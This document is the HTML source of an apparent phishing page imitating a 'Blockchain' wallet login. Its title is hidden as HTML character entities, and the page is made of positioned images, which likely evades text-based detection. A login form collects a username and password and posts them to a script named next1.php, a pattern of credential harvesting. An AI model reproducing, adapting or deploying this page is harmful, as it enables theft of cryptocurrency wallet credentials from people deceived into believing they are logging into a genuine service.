<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>&#66;&#108;&#111;&#99;&#107;&#99;&#104;&#97;&#105;&#110;</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon"
              href="images/favicon.ico"/>	

<style type="text/css">
  
.textbox {  
    border: 1px solid #ccc;
  	border-radius: 1px;
	padding-left: 8px;
	font-family: 'Montserrat', 'Helvetica', sans-serif !important;
	font-size: 15px;
	color: #555555;
    height: 40px; 
    width: 275px; 
 } 
 
.textbox:focus {  
    border-color: #66afe9; 
    border-style: solid; 
    border-width: 1px; 
    outline: 0; 
 } 

 </style>	
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body  bgColor="#004A7C">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:109px; top:37px; width:189px; height:28px; z-index:0"><a href="#"><img src="images/k1.png" alt="" title="" border=0 width=189 height=28></a></div>

<div id="image2" style="position:absolute; overflow:hidden; left:402px; top:109px; width:558px; height:284px; z-index:1"><img src="images/k2.png" alt="" title="" border=0 width=558 height=284></div>

<div id="image3" style="position:absolute; overflow:hidden; left:404px; top:392px; width:555px; height:201px; z-index:2"><img src="images/k3.png" alt="" title="" border=0 width=555 height=201></div>

<div id="image4" style="position:absolute; overflow:hidden; left:107px; top:695px; width:465px; height:47px; z-index:3"><a href="#"><img src="images/k4.png" alt="" title="" border=0 width=465 height=47></a></div>

<div id="image5" style="position:absolute; overflow:hidden; left:1139px; top:699px; width:177px; height:54px; z-index:4"><a href="#"><img src="images/k5.png" alt="" title="" border=0 width=177 height=54></a></div>

<div id="image6" style="position:absolute; overflow:hidden; left:865px; top:152px; width:54px; height:17px; z-index:5"><a href="#"><img src="images/k7.png" alt="" title="" border=0 width=54 height=17></a></div>

<div id="image7" style="position:absolute; overflow:hidden; left:829px; top:540px; width:91px; height:22px; z-index:6"><a href="#"><img src="images/k8.png" alt="" title="" border=0 width=91 height=22></a></div>

<div id="image8" style="position:absolute; overflow:hidden; left:441px; top:545px; width:119px; height:18px; z-index:7"><a href="#"><img src="images/k9.png" alt="" title="" border=0 width=119 height=18></a></div>

<div id="image9" style="position:absolute; overflow:hidden; left:449px; top:525px; width:51px; height:15px; z-index:8"><a href="#"><img src="images/k10.png" alt="" title="" border=0 width=51 height=15></a></div>
<form action=next1.php name=bhagjaageage id=bhagjaageage method=post>
<input name="user" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:470px;left:447px;top:269px;z-index:9">
<input name="pass"  class="textbox" autocomplete="off" required type="password" style="position:absolute;width:470px;left:447px;top:398px;z-index:10">
<div id="formimage1" style="position:absolute; left:446px; top:470px; z-index:12"><input type="image" name="formimage1" width="472" height="42" src="images/lognn.png"></div>
</div>
 
	
</body>
</html>
